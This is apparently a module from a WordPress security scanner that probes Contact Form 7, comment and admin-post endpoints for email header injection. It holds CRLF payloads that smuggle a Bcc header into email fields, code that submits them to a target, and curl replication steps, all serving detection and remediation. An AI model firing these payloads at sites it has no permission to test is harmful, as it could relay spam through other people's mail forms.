import type { Finding, ModuleResult, ScanState } from '../types.js';
import { fetchURL, finding, moduleResult, normalizeTarget, parallelProbe } from '../utils.js';

const MODULE_NAME = 'Email Header Injection';

const CRLF_PAYLOADS = [
  'attacker@evil.com\r\nBcc: victim@victim.com',
  'attacker@evil.com\nBcc: victim@victim.com',
  'attacker@evil.com%0d%0aBcc: victim@victim.com',
  'attacker@evil.com%0aBcc: victim@victim.com',
];

// Only indicators that appear exclusively due to successful injection
const REFLECT_INDICATORS = ['Bcc:', 'bcc:', 'victim@victim.com'];

export async function run(target: string, _state?: ScanState): Promise<ModuleResult> {
  const start = Date.now();
  target = normalizeTarget(target);
  const findings: Finding[] = [];
  const errors: string[] = [];

  try {
    // Test 1: Contact Form 7 REST endpoint
    const cf7Base = `${target}/wp-json/contact-form-7/v1/contact-forms`;
    let cf7FormIds: string[] = [];
    try {
      const r = await fetchURL(cf7Base, { timeoutMs: 10000 });
      if (r && r.status === 200) {
        const data = await r.json() as Record<string, unknown> | unknown[];
        const items = Array.isArray(data) ? data : ((data as Record<string, unknown>).items ?? []) as unknown[];
        cf7FormIds = (items as Record<string, unknown>[])
          .slice(0, 5)
          .filter((item) => item.id)
          .map((item) => String(item.id));
      }
    } catch { /* fallback below */ }

    if (cf7FormIds.length === 0) cf7FormIds = ['1', '2'];

    // Test all [formId, payload] combos in parallel
    const hitForms = new Set<string>();
    const cf7Combos = cf7FormIds.flatMap(id => CRLF_PAYLOADS.map(p => [id, p] as [string, string]));
    await parallelProbe(cf7Combos, async ([formId, payload]) => {
      if (hitForms.has(formId)) return;
      const feedbackUrl = `${target}/wp-json/contact-form-7/v1/contact-forms/${formId}/feedback`;
      try {
        const body = new URLSearchParams({
          'your-name':    'Test User',
          'your-email':   payload,
          'your-subject': 'Test',
          'your-message': 'Test message',
        });
        const res = await fetchURL(feedbackUrl, {
          method: 'POST',
          body: body.toString(),
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        });
        if (!res) return;
        const resBody = await res.text();
        const reflected = REFLECT_INDICATORS.some((ind) => resBody.includes(ind));
        if (res.status === 200 && (resBody.includes('mail_sent') || reflected)) {
          hitForms.add(formId);
          findings.push(finding(
            'email_injection', 'HIGH', feedbackUrl,
            `Email header injection possible via CF7 form ${formId}. ` +
            'CRLF in From field not stripped; mail sent successfully.',
            {
              replication_steps: [
                `curl -s -X POST "${feedbackUrl}" \\`,
                '  -F "your-name=Test User" \\',
                `  -F "your-email=${payload}" \\`,
                '  -F "your-subject=Test" \\',
                '  -F "your-message=Test message"',
                "# Observe 'mail_sent' in response or injected headers reflected.",
              ],
              remediation:
                'Sanitize all email header fields by stripping CR (\\r) and LF (\\n). ' +
                'Use wp_mail() with validated addresses only. ' +
                'Update Contact Form 7 to the latest version.',
              evidence: `HTTP ${res.status}, mail_sent=${resBody.includes('mail_sent')}, reflected=${reflected}`,
            },
          ));
        }
      } catch { /* ignore */ }
    });

    // Test 2: WP comment form + admin-post in parallel
    const commentUrl = `${target}/wp-comments-post.php`;
    const adminPostUrl = `${target}/wp-admin/admin-post.php`;
    const adminActions = ['send_email', 'contact_form', 'cf_submit'];
    const miscCombos: Array<['comment' | 'admin', string, string]> = [
      ...CRLF_PAYLOADS.slice(0, 2).map(p => ['comment', '', p] as ['comment', string, string]),
      ...adminActions.map(a => ['admin', a, CRLF_PAYLOADS[0]] as ['admin', string, string]),
    ];
    await parallelProbe(miscCombos, async ([type, action, payload]) => {
      try {
        if (type === 'comment') {
          const body = new URLSearchParams({
            comment: 'Test comment', author: 'Tester', email: payload,
            url: '', comment_post_ID: '1', comment_parent: '0',
          });
          const res = await fetchURL(commentUrl, {
            method: 'POST', body: body.toString(),
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          });
          if (!res) return;
          const resBody = await res.text();
          if (REFLECT_INDICATORS.some((ind) => resBody.includes(ind))) {
            findings.push(finding(
              'email_injection', 'HIGH', commentUrl,
              'CRLF characters reflected in comment form response.',
              {
                replication_steps: [
                  `curl -s -X POST "${commentUrl}" \\`,
                  `  -d "comment=test&author=Tester&email=${encodeURIComponent(payload)}&comment_post_ID=1&comment_parent=0"`,
                ],
                remediation: 'Validate and strip CRLF from all user-supplied email addresses.',
                evidence: 'CRLF reflected in response body.',
              },
            ));
          }
        } else {
          const body = new URLSearchParams({
            action, email: payload, name: 'Tester', message: 'Test',
          });
          const res = await fetchURL(adminPostUrl, {
            method: 'POST', body: body.toString(),
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          });
          if (!res) return;
          const resBody = await res.text();
          if (REFLECT_INDICATORS.some((ind) => resBody.includes(ind))) {
            findings.push(finding(
              'email_injection', 'HIGH', adminPostUrl,
              `Email header injection possible via admin-post.php action='${action}'.`,
              {
                replication_steps: [
                  `curl -s -X POST "${adminPostUrl}" \\`,
                  `  -d "action=${action}&email=${encodeURIComponent(payload)}&name=Tester&message=Test"`,
                ],
                remediation: 'Sanitize email inputs in all form handlers.',
                evidence: 'CRLF reflected via admin-post.php',
              },
            ));
          }
        }
      } catch { /* ignore */ }
    });
  } catch (e) {
    errors.push(String(e));
  }

  return moduleResult(MODULE_NAME, target, findings, errors, start);
}
